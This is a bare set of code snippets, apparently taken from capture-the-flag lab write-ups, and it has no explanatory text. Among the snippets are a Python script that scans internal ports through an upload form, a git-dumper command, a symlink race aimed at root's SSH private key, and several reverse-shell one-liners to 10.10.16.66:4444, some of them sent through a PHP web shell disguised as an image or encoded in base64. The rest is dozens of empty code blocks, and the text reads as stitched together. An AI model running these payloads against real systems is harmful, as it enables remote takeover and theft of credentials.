```
#!/usr/bin/python3
import requests
with open("a", 'wb') as f:
f.write(b'')
for port in range(1, 65535):
with open("a", 'rb') as file:
data_post = {"bookurl": f"http://127.0.0.1:{port}"}
data_file = {"bookfile": file}
try:
r = requests.post("http://editorial.htb/upload-cover",
files=data_file, data=data_post)
if not r.text.strip().endswith('.jpeg'):
print(f"{port} --- {r.text}")
except requests.RequestException as e:
print(f"Error on port {port}: {e}")
```

```
echo "bash -i >& /dev/tcp/10.10.16.66/4444 0>&1" > /tmp/shell.sh
```

```
git-dumper http://dev.linkvortex.htb/.git gitdump
```

```
while true;do ln -sf /root/.ssh/id_rsa /var/quarantined/key.png;done
```

```
curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.16.66/4444 0>&1"' http://10.129.227.126/uploads/10_10_16_66.php.png
```

```
uploads/10_10_16_66.php.png?cmd=
```

```
echo -n 'bash -c "bash -i >/dev/tcp/10.10.16.66/4444 0>&1"' | base64
```

```
YmFzaCAtYyAiYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTYuNjYvNDQ0NCAwPiYxIg==
```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```